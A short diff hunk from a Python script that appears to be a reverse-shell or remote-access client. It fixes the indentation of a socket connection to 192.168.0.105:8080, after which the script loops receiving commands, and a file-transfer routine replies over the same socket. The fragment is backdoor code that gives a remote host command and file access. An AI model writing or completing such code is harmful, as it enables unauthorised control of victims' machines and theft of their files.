@@ -20,7 +20,7 @@ def transfer(s, path):
         s.send('FILE NOT FOUND'.encode())
 def connecting():
     s = socket.socket()
-s.connect(("192.168.0.105", 8080))
+    s.connect(("192.168.0.105", 8080))
 
     while True:
         command = s.recv(8192)
